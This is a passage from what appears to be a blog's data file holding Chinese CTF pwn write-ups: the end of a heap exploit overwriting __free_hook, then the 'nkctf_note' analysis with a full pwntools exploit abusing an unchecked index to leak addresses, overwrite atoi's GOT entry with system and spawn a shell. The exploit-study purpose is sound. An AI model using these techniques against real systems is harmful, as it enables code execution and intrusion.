:u32(data.ljust(<span class=\"number\">4</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">leak    = <span class=\"keyword\">lambda</span> name,addr          :log.success(<span class=\"string\">&#x27;&#123;&#125; = &#123;&#125;&#x27;</span>.<span class=\"built_in\">format</span>(name, addr))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">debug</span>(<span class=\"params\">cmd=<span class=\"string\">&#x27;\\n&#x27;</span></span>):</span><br><span class=\"line\">  gdb.attach(p,cmd)</span><br><span class=\"line\">  pause()</span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\">idx,size</span>):</span><br><span class=\"line\">    ru(<span class=\"string\">&quot;Your choice: &quot;</span>)</span><br><span class=\"line\">    sl(<span class=\"string\">&quot;1&quot;</span>)</span><br><span class=\"line\">    ru(<span class=\"string\">&quot;Enter the index: &quot;</span>)</span><br><span class=\"line\">    sl(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">    ru(<span class=\"string\">&quot;Enter the Size: &quot;</span>)</span><br><span class=\"line\">    sl(<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">delete</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">    ru(<span class=\"string\">&quot;Your choice: &quot;</span>)</span><br><span class=\"line\">    sl(<span class=\"string\">&quot;2&quot;</span>)</span><br><span class=\"line\">    ru(<span class=\"string\">&quot;Enter the index: &quot;</span>)</span><br><span class=\"line\">    sl(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">edit</span>(<span class=\"params\">idx,content</span>):</span><br><span class=\"line\">    ru(<span class=\"string\">&quot;Your choice: &quot;</span>)</span><br><span class=\"line\">    sl(<span class=\"string\">&quot;3&quot;</span>)</span><br><span class=\"line\">    ru(<span class=\"string\">&quot;Enter the index: &quot;</span>)</span><br><span class=\"line\">    sl(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">    ru(<span class=\"string\">&quot;Enter the content: &quot;</span>)</span><br><span class=\"line\">    s(content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">show</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">    ru(<span class=\"string\">&quot;Your choice: &quot;</span>)</span><br><span class=\"line\">    sl(<span class=\"string\">&quot;4&quot;</span>)</span><br><span class=\"line\">    ru(<span class=\"string\">&quot;Enter the index: &quot;</span>)</span><br><span class=\"line\">    sl(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0</span>,<span class=\"number\">0x28</span>)</span><br><span class=\"line\">add(<span class=\"number\">1</span>,<span class=\"number\">0x28</span>)</span><br><span class=\"line\">add(<span class=\"number\">2</span>,<span class=\"number\">0x80</span>)</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">8</span>):</span><br><span class=\"line\">    add(i+<span class=\"number\">3</span>,<span class=\"number\">0x80</span>)</span><br><span class=\"line\">add(<span class=\"number\">11</span>,<span class=\"number\">0x28</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">payload=<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x28</span>+<span class=\"string\">b&#x27;\\x61&#x27;</span></span><br><span class=\"line\">edit(<span class=\"number\">0</span>,payload)</span><br><span class=\"line\">delete(<span class=\"number\">1</span>)</span><br><span class=\"line\">add(<span class=\"number\">1</span>,<span class=\"number\">0x58</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># leak heap_base and libc</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">3</span>,<span class=\"number\">10</span>):</span><br><span class=\"line\">    delete(i)</span><br><span class=\"line\">    </span><br><span class=\"line\">delete(<span class=\"number\">2</span>)</span><br><span class=\"line\">delete(<span class=\"number\">10</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">payload=<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x30</span>+<span class=\"string\">b&#x27;\\n&#x27;</span></span><br><span class=\"line\">edit(<span class=\"number\">1</span>,payload)</span><br><span class=\"line\">show(<span class=\"number\">1</span>)</span><br><span class=\"line\">ru(<span class=\"string\">&#x27;\\n&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># pause()</span></span><br><span class=\"line\"><span class=\"comment\"># sleep(0.1)</span></span><br><span class=\"line\"></span><br><span class=\"line\">libc_addr=(uu64(ru(<span class=\"string\">&#x27;\\n&#x27;</span>)[:-<span class=\"number\">1</span>])&lt;&lt;<span class=\"number\">8</span>)</span><br><span class=\"line\">libcbase=libc_addr-<span class=\"number\">0x60</span>-<span class=\"number\">0x10</span>-libc.sym[<span class=\"string\">&#x27;__malloc_hook&#x27;</span>]</span><br><span class=\"line\">leak(<span class=\"string\">&quot;libcbase&quot;</span>,<span class=\"built_in\">hex</span>(libcbase))</span><br><span class=\"line\">leak(<span class=\"string\">&quot;libc_addr&quot;</span>,<span class=\"built_in\">hex</span>(libc_addr))</span><br><span class=\"line\">pause()</span><br><span class=\"line\"></span><br><span class=\"line\">free_hook=libcbase+libc.sym[<span class=\"string\">&#x27;__free_hook&#x27;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">payload=<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x37</span>+<span class=\"string\">b&#x27;\\n&#x27;</span></span><br><span class=\"line\">edit(<span class=\"number\">1</span>,payload)</span><br><span class=\"line\">show(<span class=\"number\">1</span>)</span><br><span class=\"line\">ru(<span class=\"string\">&quot;\\n&quot;</span>)</span><br><span class=\"line\">heap_addr=uu64(ru(<span class=\"string\">&quot;\\n&quot;</span>)[:-<span class=\"number\">1</span>])</span><br><span class=\"line\">heapbase=(heap_addr&gt;&gt;<span class=\"number\">12</span>)&lt;&lt;<span class=\"number\">12</span></span><br><span class=\"line\"></span><br><span class=\"line\">leak(<span class=\"string\">&quot;libcbase&quot;</span>,<span class=\"built_in\">hex</span>(libcbase))</span><br><span class=\"line\">leak(<span class=\"string\">&quot;heapbase&quot;</span>,<span class=\"built_in\">hex</span>(heapbase))</span><br><span class=\"line\"></span><br><span class=\"line\">payload=<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x28</span>+p64(<span class=\"number\">0x90</span>)+p64(libc_addr)+p64(heapbase+<span class=\"number\">0x770</span>)+<span class=\"string\">b&#x27;\\n&#x27;</span></span><br><span class=\"line\">edit(<span class=\"number\">1</span>,payload)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">7</span>):</span><br><span class=\"line\">    add(i+<span class=\"number\">3</span>,<span class=\"number\">0x80</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">10</span>,<span class=\"number\">0x80</span>)</span><br><span class=\"line\"><span class=\"comment\"># leak(&quot;libcbase&quot;,hex(libcbase))</span></span><br><span class=\"line\"><span class=\"comment\"># leak(&quot;heapbase&quot;,hex(heapbase))</span></span><br><span class=\"line\"><span class=\"comment\"># debug()</span></span><br><span class=\"line\">add(<span class=\"number\">2</span>,<span class=\"number\">0x80</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">delete(<span class=\"number\">10</span>)</span><br><span class=\"line\">delete(<span class=\"number\">2</span>)</span><br><span class=\"line\">payload=<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x28</span>+p64(<span class=\"number\">0x90</span>)+p64(free_hook^(heapbase&gt;&gt;<span class=\"number\">12</span>))+p64(heapbase+<span class=\"number\">0x770</span>)+<span class=\"string\">b&#x27;\\n&#x27;</span></span><br><span class=\"line\">edit(<span class=\"number\">1</span>,payload)</span><br><span class=\"line\">add(<span class=\"number\">12</span>,<span class=\"number\">0x80</span>)</span><br><span class=\"line\">add(<span class=\"number\">2</span>,<span class=\"number\">0x80</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># overwrite free_hook</span></span><br><span class=\"line\">payload=p64(libcbase+libc.sym[<span class=\"string\">&#x27;system&#x27;</span>])+<span class=\"string\">b&#x27;\\n&#x27;</span></span><br><span class=\"line\">edit(<span class=\"number\">2</span>,payload)</span><br><span class=\"line\">edit(<span class=\"number\">12</span>,<span class=\"string\">b&quot;/bin/sh\\x00\\n&quot;</span>)</span><br><span class=\"line\">delete(<span class=\"number\">12</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>"},{"title":"nkctf_note","date":"2023-03-29T09:23:02.000Z","_content":"\nnkctf的一道题，看到libc是musl的之后没仔细看就跑去学musl了，结果上了大当，这题和musl libc没什么关系。\n\n<!-- more -->\n\n## 查壳\n\n用的musl libc1.2.3。\n\n```sh\nmusl libc (x86_64)\nVersion 1.2.3\nDynamic Program Loader\n```\n\n当时没注意到`RELRO: Partial RELRO`，也就是说**可以改写GOT表**\n\n```sh\n[*] '/home/a1ph0nse/PwnPractice/CtfGame/NK/note/nk_note'\n    Arch:     amd64-64-little\n    RELRO:    Partial RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      PIE enabled\n```\n\n## 逆向分析\n\n具有增删查改的功能。\n\n首先指定要的操作，然后输入idx\n\n增：堆指针从0x40A0开始，chunk的size可以任意指定，`malloc`后存入`(&ptr)[idx]`，并写入size大小的content。\n\n删：释放idx指定的chunk，并且在对应位置清0。\n\n查：`puts((const char *)(&ptr)[idx])`。\n\n改：向idx指定的chunk写入size大小的content。\n\n存在问题：\n\n- `idx`是`int`类型且没有限制，可以超出堆指针的范围，可以是负数。\n- 改的时候没有对`size`进行检测\n\n## 漏洞利用\n\n堆指针在`bss`段，`idx`可以下标溢出写到其他地方。这里写的方法是从`ptr+offset`处取出一个地址`addr`，修改`addr`指向位置的内容。\n\n这里的GOT表可以写，但因为有PIE我们不能直接定位到GOT表，要先想办法泄露地址。\n\n```asm\n0x55bccd41c0a0 <ptr>:\t0x0000000000000000\t0x0000000000000000\n0x55bccd41c0b0 <ptr+16>:\t0x0000000000000000\t0x0000000000000000\n0x55bccd41c0c0 <ptr+32>:\t0x0000000000000000\t0x0000000000000000\n0x55bccd41c0d0 <ptr+48>:\t0x0000000000000000\t0x0000000000000000\n0x55bccd41c0e0 <ptr+64>:\t0x0000000000000000\t0x0000000000000000\n0x55bccd41c0f0 <ptr+80>:\t0x0000000000000000\t0x0000000000000000\n0x55bccd41c100 <ptr+96>:\t0x0000000000000000\t0x0000000000000000\n0x55bccd41c110 <ptr+112>:\t0x0000000000000000\t0x0000000000000000\n0x55bccd41c120:\t0x000055bcced64018\t0x0000ff0000000000\n```\n\n可以看到在bss段后面ptr+0x80的位置有一个堆地址0x000055bcced64018，使用`mheap`可以看到他是`active[23]`的一个`meta`：\n\n```asm\nactive[23] : 0x55bcced64018 (mem: 0x55bccd41c120)\npwndbg> p *(struct meta*)0x55bcced64018\n$1 = {\n  prev = 0x55bcced64248,\n  next = 0x55bcced640e0,\n  mem = 0x55bccd41c120, # 与elfbase的偏移是固定的\n  avail_mask = 0,\n  freed_mask = 1,\n  last_idx = 0,\n  freeable = 0,\n  sizeclass = 23,\n  maplen = 0\n}\n\n```\n\n而其中的`mem`与程序基地址的偏移是固定的，可以通过它泄露出基地址。\n\n```asm\n             Start                End Perm     Size Offset File\n    0x55bccd418000     0x55bccd419000 r--p     1000      0 /home/a1ph0nse/PwnPractice/CtfGame/NK/note/nk_note\n    0x55bccd419000     0x55bccd41a000 r-xp     1000   1000 /home/a1ph0nse/PwnPractice/CtfGame/NK/note/nk_note\n    0x55bccd41a000     0x55bccd41b000 r--p     1000   2000 /home/a1ph0nse/PwnPractice/CtfGame/NK/note/nk_note\n    0x55bccd41b000     0x55bccd41c000 r--p     1000   2000 /home/a1ph0nse/PwnPractice/CtfGame/NK/note/nk_note\n    0x55bccd41c000     0x55bccd41d000 rw-p     1000   3000 /home/a1ph0nse/PwnPractice/CtfGame/NK/note/nk_note\n    0x55bccd41d000     0x55bccd41f000 rw-p     2000   5000 /home/a1ph0nse/PwnPractice/CtfGame/NK/note/nk_note\n```\n\n由上我们可以泄露`elfbase`和`heapbase`，为了防止出问题，泄露地址后要把被覆盖的内容恢复。\n\n通过`elfbase`，我们可以定位到`ptr`和前面的`GOT`表，但要改写内容我们还需要知道`libcbase`，这样才知道要将`GOT`表项改写为什么内容。\n\n看了WP才知道，**libc会将小的堆放在bss段中**，因此我们可以申请一个小的堆，在里面写上`GOT`表项的地址，借此泄露出`libcbase`，并改写`GOT`表项`get shell`。\n\n这里选择改写`atoi`为`system`并输入`/bin/sh\\x00`来`get shell`\n\n**exp:**\n\n```py\nfrom pwn import*\ncontext(log_level='debug',os='linux',arch='amd64')\nfilename='nk_note'\nelf=ELF('./'+filename)\nlibc=ELF('./libc.so')\np=process('./'+filename)\n#p=process([\"qemu-arm\",\"-L\",\"...\",\"-g\", \"8888\", \"./\"+filename])\n#p=process(['./ld-2.23.so','./'+filename],env={'LD_PRELOAD':'./libc-2.23.so'})\n#p=remote('',)\n\ns       = lambda data               :p.send(data)\nsl      = lambda data               :p.sendline(data)\nr       = lambda num=4096           :p.recv(num)\nrl      = lambda num=4096           :p.recvline(num)\nru      = lambda x                  :p.recvuntil(x)\nitr     = lambda                    :p.interactive()\nuu32    = lambda data               :u32(data.ljust(4,b'\\x00'))\nuu64    = lambda data               :u64(data.ljust(8,b'\\x00'))\nleak    = lambda name,addr          :log.success('{} = {}'.format(name, addr))\n\ndef debug(cmd='\\n'):\n  gdb.attach(p,cmd)\n  pause()\n    \n\ndef add(idx,size,content):\n  ru(\"your choice: \")\n  sl(\"1\")\n  ru(\"Index: \")\n  sl(str(idx))\n  ru(\"Size: \")\n  sl(str(size))\n  ru(\"Content: \")\n  s(content)\n\ndef edit(idx,size,content):\n  ru(\"your choice: \")\n  sl(\"2\")\n  ru(\"Index: \")\n  sl(str(idx))\n  ru(\"Size: \")\n  sl(str(size))\n  ru(\"Content: \")\n  s(content)\n\ndef free(idx):\n  ru(\"your choice: \")\n  sl(\"3\")\n  ru(\"Index: \")\n  sl(str(idx))\n\ndef show(idx):\n  ru(\"your choice: \")\n  sl(\"4\")\n  ru(\"Index: \")\n  sl(str(idx))\n\n\n# leak heapbase\nshow(16)\nheapaddr=uu64(ru('\\n')[:-1])\nleak(\"heapaddr\",hex(heapaddr))\nheapbase=heapaddr-0x248\nleak(\"heapbase\",hex(heapbase))\n\n# leak elfbase\npaylooad=b'a'*0x10\nedit(16,0x10,paylooad)\nshow(16)\nru(b'a'*0x10)\nelfbase=uu64(ru('\\n')[:-1])-0x4120\nleak(\"elfbase\",hex(elfbase))\n\n# recover the meta\npayload=p64(heapaddr)+p64(heapbase+0xe0)\nedit(16,0x10,payload)\n\nptr_addr=elfbase+0x40A0\nleak(\"ptr_addr\",hex(ptr_addr))\n\n# note_addr=ptr+0x2f10\nnote_addr=ptr_addr+0x2f10\nleak(\"note_addr\",hex(note_addr))\n\natoi_got=elfbase+elf.got['atoi']\nleak(\"atoi_got\",hex(atoi_got))\npayload=p64(atoi_got)+b'a'*0x28\nadd(0,0x30,payload)\n\n# offset=0x2f10/0x8=0x5e2\n# leak libc\nshow(0x5e2)\nlibc_addr=uu64(ru('\\n')[:-1])\nleak(\"libc_addr\",hex(libc_addr))\nlibcbase=libc_addr-libc.sym['atoi']\nleak(\"libcbase\",hex(libcbase))\n\nsys_addr=libcbase+libc.sym['system']\n# get shell\npayload=p64(sys_addr)\nedit(0x5e2,0x8,payload)\n\nr()\ns(\"/bin/sh\\x00\")\n# debug()\n\nitr()\n```\n\n\n\n","source":"_posts/nkctf_note.md","raw":"---\ntitle: nkctf_note\ndate: 2023-03-29 17:23:02\ncategories: \n- pwn_wp\ntags: \n- pwn\n- musl\n- index_overflow\n\n---\n\nnkctf的一道题，看到libc是musl的之后没仔细看就跑去学musl了，结果上了大当，这题和musl libc没什么关系。\n\n<!-- more -->\n\n## 查壳\n\n用的musl libc1.2.3。\n\n```sh\nmusl libc (x86_64)\nVersion 1.2.3\nDynamic Program Loader\n```\n\n当时没注意到`RELRO: Partial RELRO`，也就是说**可以改写GOT表**\n\n```sh\n[*] '/home/a1ph0nse/PwnPractice/CtfGame/NK/note/nk_note'\n    Arch:     amd64-64-little\n    RELRO:    Partial RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      PIE enabled\n```\n\n## 逆向分析\n\n具有增删查改的功能。\n\n首先指定要的操作，然后输入idx\n\n增：堆指针从0x40A0开始，chunk的size可以任意指定，`malloc`后存入`(&ptr)[idx]`，并写入size大小的content。\n\n删：释放idx指定的chunk，并且在对应位置清0。\n\n查：`puts((const char *)(&ptr)[idx])`。\n\n改：向idx指定的chunk写入size大小的content。\n\n存在问题：\n\n- `idx`是`int`类型且没有限制，可以超出堆指针的范围，可以是负数。\n- 改的时候没有对`size`进行检测\n\n## 漏洞利用\n\n堆指针在`bss`段，`idx`可以下标溢出写到其他地方。这里写的方法是从`ptr+offset`处取出一个地址`addr`，修改`addr`指向位置的内容。\n\n这里的GOT表可以写，但因为有PIE我们不能直接定位到GOT表，要先想办法泄露地址。\n\n```asm\n0x55bccd41c0a0 <ptr>:\t0x0000000000000000\t0x0000000000000000\n0x55bccd41c0b0 <ptr+16>:\t0x0000000000000000\t0x0000000000000000\n0x55bccd41c0c0 <ptr+32>:\t0x0000000000000000\t0x0000000000000000\n0x55bccd41c0d0 <ptr+48>:\t0x0000000000000000\t0x0000000000000000\n0x55bccd41c0e0 <ptr+64>:\t0x0000000000000000\t0x0000000000000000\n0x55bccd41c0f0 <ptr+80>:\t0x0000000000000000\t0x0000000000000000\n0x55bccd41c100 <ptr+96>:\t0x0000000000000000\t0x0000000000000000\n0x55bccd41c110 <ptr+112>:\t0x0000000000000000\t0x0000000000000000\n0x55bccd41c120:\t0x000055bcced64018\t0x0000ff0000000000\n```\n\n可以看到在bss段后面ptr+0x80的位置有一个堆地址0x000055bcced64018，使用`mheap`可以看到他是`active[23]`的一个`meta`：\n\n```asm\nactive[23] : 0x55bcced64018 (mem: 0x55bccd41c120)\npwndbg> p *(struct meta*)0x55bcced64018\n$1 = {\n  prev = 0x55bcced64248,\n  next = 0x55bcced640e0,\n  mem = 0x55bccd41c120, # 与elfbase的偏移是固定的\n  avail_mask = 0,\n  freed_mask = 1,\n  last_idx = 0,\n  freeable = 0,\n  sizeclass = 23,\n  maplen = 0\n}\n\n```\n\n而其中的`mem`与程序基地址的偏移是固定的，可以通过它泄露出基地址。\n\n```asm\n             Start                End Perm     Size Offset File\n    0x55bccd418000     0x55bccd419000 r--p     1000      0 /home/a1ph0nse/PwnPractice/CtfGame/NK/note/nk_note\n    0x55bccd419000     0x55bccd41a000 r-xp     1000   1000 /home/a1ph0nse/PwnPractice/CtfGame/NK/note/nk_note\n    0x55bccd41a000     0x55bccd41b000 r--p     1000   2000 /home/a1ph0nse/PwnPractice/CtfGame/NK/note/nk_note\n    0x55bccd41b000     0x55bccd41c000 r--p     1000   2000 /home/a1ph0nse/PwnPractice/CtfGame/NK/note/nk_note\n    0x55bccd41c000     0x55bccd41d000 rw-p     1000   3000 /home/a1ph0nse/PwnPractice/CtfGame/NK/note/nk_note\n    0x55bccd41d000     0x55bccd41f000 rw-p     2000   5000 /home/a1ph0nse/PwnPractice/CtfGame/NK/note/nk_note\n```\n\n由上我们可以泄露`elfbase`和`heapbase`，为了防止出问题，泄露地址后要把被覆盖的内容恢复。\n\n通过`elfbase`，我们可以定位到`ptr`和前面的`GOT`表，但要改写内容我们还需要知道`libcbase`，这样才知道要将`GOT`表项改写为什么内容。\n\n看了WP才知道，**libc会将小的堆放在bss段中**，因此我们可以申请一个小的堆，在里面写上`GOT`表项的地址，借此泄露出`libcbase`，并改写`GOT`表项`get shell`。\n\n这里选择改写`atoi`为`system`并输入`/bin/sh\\x00`来`get shell`\n\n**exp:**\n\n```py\nfrom pwn import*\ncontext(log_level='debug',os='linux',arch='amd64')\nfilename='nk_note'\nelf=ELF('./'+filename)\nlibc=ELF('./libc.so')\np=process('./'+filename)\n#p=process([\"qemu-arm\",\"-L\",\"...\",\"-g\", \"8888\", \"./\"+filename])\n#p=process(['./ld-2.23.so','./'+filename],env={'LD_PRELOAD':'./libc-2.23.so'})\n#p=remote('',)\n\ns       = lambda data               :p.send(data)\nsl      = lambda data               :p.sendline(data)\nr       = lambda num=4096           :p.recv(num)\nrl      = lambda num=4096           :p.recvline(num)\nru      = lambda x                  :p.recvuntil(x)\nitr     = lambda                    :p.interactive()\nuu32    = lambda data               :u32(data.ljust(4,b'\\x00'))\nuu64    = lambda data               :u64(data.ljust(8,b'\\x00'))\nleak    = lambda name,addr          :log.success('{} = {}'.format(name, addr))\n\ndef debug(cmd='\\n'):\n  gdb.attach(p,cmd)\n  pause()\n    \n\ndef add(idx,size,content):\n  ru(\"your choice: \")\n  sl(\"1\")\n  ru(\"Index: \")\n  sl(str(idx))\n  ru(\"Size: \")\n  sl(str(size))\n  ru(\"Content: \")\n  s(content)\n\ndef edit(idx,size,content):\n  ru(\"your choice: \")\n  sl(\"2\")\n  ru(\"Index: \")\n  sl(str(idx))\n  ru(\"Size: \")\n  sl(str(size))\n  ru(\"Content: \")\n  s(content)\n\ndef free(idx):\n  ru(\"your choice: \")\n  sl(\"3\")\n  ru(\"Index: \")\n  sl(str(idx))\n\ndef show(idx):\n  ru(\"your choice: \")\n  sl(\"4\")\n  ru(\"Index: \")\n  sl(str(idx))\n\n\n# leak heapbase\nshow(16)\nheapaddr=uu64(ru('\\n')[:-1])\nleak(\"heapaddr\",hex(heapaddr))\nheapbase=heapaddr-0x248\nleak(\"heapbase\",hex(heapbase))\n\n# leak elfbase\npaylooad=b'a'*0x10\nedit(16,0x10,paylooad)\nshow(16)\nru(b'a'*0x10)\nelfbase=uu64(ru('\\n')[:-1])-0x4120\nleak(\"elfbase\",hex(elfbase))\n\n# recover the meta\npayload=p64(heapaddr)+p64(heapbase+0xe0)\nedit(16,0x10,payload)\n\nptr_addr=elfbase+0x40A0\nleak(\"ptr_addr\",hex(ptr_addr))\n\n# note_addr=ptr+0x2f10\nnote_addr=ptr_addr+0x2f10\nleak(\"note_addr\",hex(note_addr))\n\natoi_got=elfbase+elf.got['atoi']\nleak(\"atoi_got\",hex(atoi_got))\npayload=p64(atoi_got)+b'a'*0x28\nadd(0,0x30,payload)\n\n# offset=0x2f10/0x8=0x5e2\n# leak libc\nshow(0x5e2)\nlibc_addr=uu64(ru('\\n')[:-1])\nleak(\"libc_addr\",hex(libc_addr))\nlibcbase=libc_addr-libc.sym['atoi']\nleak(\"libcbase\",hex(libcbase))\n\nsys_addr=libcbase+libc.sym['system']\n# get shell\npayload=p64(sys_addr)\nedit(0x5e2,0x8,payload)\n\nr()\ns(\"/bin/sh\\x00\")\n# debug()\n\nitr()\n```\n\n\n\n","slug":"nkctf_note","published":1,"updated":"2023-03-30T08:15:40.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clg9czaga004u5oud9g306lqm","content":"<p>nkctf的一道题，看到libc是musl的之后没仔细看就跑去学musl了，结果上了大当，这题和musl libc没什么关系。</p>\n<span id=\"more\"></span>\n\n<h2 id=\"查壳\"><a href=\"#查壳\" class=\"headerlink\" title=\"查壳\"></a>查壳</h2><p>用的musl libc1.2.3。</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">musl libc (x86_64)</span><br><span class=\"line\">Version 1.2.3</span><br><span class=\"line\">Dynamic Program Loader</span><br></pre></td></tr></table></figure>\n\n<p>当时没注意到<code>RELRO: Partial RELRO</code>，也就是说<strong>可以改写GOT表</strong></p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[*] <span class=\"string\">&#x27;/home/a1ph0nse/PwnPractice/CtfGame/NK/note/nk_note&#x27;</span></span><br><span class=\"line\">    Arch:     amd64-64-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    Canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"逆向分析\"><a href=\"#逆向分析\" class=\"headerlink\" title=\"逆向分析\"></a>逆向分析</h2><p>具有增删查改的功能。</p>\n<p>首先指定要的操作，然后输入idx</p>\n<p>增：堆指针从0x40A0开始，chunk的size可以任意指定，<code>malloc</code>后存入<code>(&amp;ptr)[idx]</code>，并写入size大小的content。</p>\n<p>删：释放idx指定的chunk，并且在对应位置清0。</p>\n<p>查：<code>puts((const char *)(&amp;ptr)[idx])</code>。</p>\n<p>改：向idx指定的chunk写入size大小的content。</p>\n<p>存在问题：</p>\n<ul>\n<li><code>idx</code>是<code>int</code>类型且没有限制，可以超出堆指针的范围，可以是负数。</li>\n<li>改的时候没有对<code>size</code>进行检测</li>\n</ul>\n<h2 id=\"漏洞利用\"><a href=\"#漏洞利用\" class=\"headerlink\" title=\"漏洞利用\"></a>漏洞利用</h2><p>堆指针在<code>bss</code>段，<code>idx</code>可以下标溢出写到其他地方。这里写的方法是从<code>ptr+offset</code>处取出一个地址<code>addr</code>，修改<code>addr</code>指向位置的内容。</p>\n<p>这里的GOT表可以写，但因为有PIE我们不能直接定位到GOT表，要先想办法泄露地址。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0x55bccd41c0a0 &lt;ptr&gt;:\t0x0000000000000000\t0x0000000000000000</span><br><span class=\"line\">0x55bccd41c0b0 &lt;ptr+16&gt;:\t0x0000000000000000\t0x0000000000000000</span><br><span class=\"line\">0x55bccd41c0c0 &lt;ptr+32&gt;:\t0x0000000000000000\t0x0000000000000000</span><br><span class=\"line\">0x55bccd41c0d0 &lt;ptr+48&gt;:\t0x0000000000000000\t0x0000000000000000</span><br><span class=\"line\">0x55bccd41c0e0 &lt;ptr+64&gt;:\t0x0000000000000000\t0x0000000000000000</span><br><span class=\"line\">0x55bccd41c0f0 &lt;ptr+80&gt;:\t0x0000000000000000\t0x0000000000000000</span><br><span class=\"line\">0x55bccd41c100 &lt;ptr+96&gt;:\t0x0000000000000000\t0x0000000000000000</span><br><span class=\"line\">0x55bccd41c110 &lt;ptr+112&gt;:\t0x0000000000000000\t0x0000000000000000</span><br><span class=\"line\">0x55bccd41c120:\t0x000055bcced64018\t0x0000ff0000000000</span><br></pre></td></tr></table></figure>\n\n<p>可以看到在bss段后面ptr+0x80的位置有一个堆地址0x000055bcced64018，使用<code>mheap</code>可以看到他是<code>active[23]</code>的一个<code>meta</code>：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">active[23] : 0x55bcced64018 (mem: 0x55bccd41c120)</span><br><span class=\"line\">pwndbg&gt; p *(struct meta*)0x55bcced64018</span><br><span class=\"line\">$1 = &#123;</span><br><span class=\"line\">  prev = 0x55bcced64248,</span><br><span class=\"line\">  next = 0x55bcced640e0,</span><br><span class=\"line\">  mem = 0x55bccd41c120, # 与elfbase的偏移是固定的</span><br><span class=\"line\">  avail_mask = 0,</span><br><span class=\"line\">  freed_mask = 1,</span><br><span class=\"line\">  last_idx = 0,</span><br><span class=\"line\">  freeable = 0,</span><br><span class=\"line\">  sizeclass = 23,</span><br><span class=\"line\">  maplen = 0</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>而其中的<code>mem</code>与程序基地址的偏移是固定的，可以通过它泄露出基地址。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">         Start                End Perm     Size Offset File</span><br><span class=\"line\">0x55bccd418000     0x55bccd419000 r--p     1000      0 /home/a1ph0nse/PwnPractice/CtfGame/NK/note/nk_note</span><br><span class=\"line\">0x55bccd419000     0x55bccd41a000 r-xp     1000   1000 